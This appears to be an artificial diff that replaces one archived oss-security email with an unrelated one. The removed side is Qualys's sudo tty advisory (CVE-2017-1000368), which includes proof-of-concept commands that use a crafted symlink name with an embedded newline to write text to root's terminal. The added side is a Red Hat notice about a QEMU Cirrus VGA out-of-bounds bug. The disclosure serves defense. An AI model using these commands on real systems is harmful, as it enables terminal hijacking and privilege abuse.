@@ -1,38 +1,26 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/06/6
-Message-ID: <20170606223100.GD27224@localhost.localdomain>
-Date: Tue, 6 Jun 2017 15:31:00 -0700
-From: Qualys Security Advisory <qsa@...lys.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: Arbitrary terminal access via sudo on Linux
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/21/3
+Message-ID: <alpine.LFD.2.20.1702211905270.17805@wniryva>
+Date: Tue, 21 Feb 2017 19:06:00 +0530 (IST)
+From: P J P <ppandit@...hat.com>
+To: oss security list <oss-security@...ts.openwall.com>
+cc: Stefano Stabellini <sstabellini@...nel.org>,  Gerd Hoffmann <ghoffman@...hat.com>
+Subject: Re: CVE-2017-2620 Qemu: display: cirrus: out-of-bounds access issue while in cirrus_bitblt_cputovideo
 Content-Type: text/plain; charset=utf-8
 
-On Fri, Jun 02, 2017 at 12:55:10PM -0600, Todd C. Miller wrote:
-> However, the arbitrary tty access IS exploitable in 1.8.20p1.
++-- On Tue, 21 Feb 2017, P J P wrote --+
+| Quick emulator(Qemu) built with the Cirrus CLGD 54xx VGA Emulator support is
+| vulnerable to an out-of-bounds access issue. It could occur while copying VGA
+| data in cirrus_bitblt_cputovideo.
+| 
+| A privileged user inside guest could use this flaw to crash the Qemu process
+| resulting in DoS OR potentially execute arbitrary code on the host with
+| privileges of Qemu process on the host.
 
-For example, against Sudo < 1.8.20p1:
+Upstream patch:
+  -> https://lists.gnu.org/archive/html/qemu-devel/2017-02/msg04700.html
 
-$ /usr/bin/sudo -l
-...
-User john may run the following commands on localhost:
-    (nobody) /usr/bin/sum
-
-$ ln -s /usr/bin/sudo '     1026 '
-(1026 is tty2, currently used by root)
-
-$ ./'     1026 ' -r unconfined_r -u nobody /usr/bin/sum $'--\nHELLO\nWORLD\n'
-(this is written to root's tty2)
-
-Or, against Sudo = 1.8.20p1:
-
-$ ln -s /usr/bin/sudo $')     1026 \n'
-$ ./$')     1026 \n' -r unconfined_r -u nobody /usr/bin/sum $'--\nHELLO\nWORLD\n'
-
-CVE-2017-1000368 was assigned to this newline vulnerability:
-
-https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000368
-
-With best regards,
-
--- 
-the Qualys Security Advisory team
+Thank you.
+--
+Prasad J Pandit / Red Hat Product Security Team
+47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
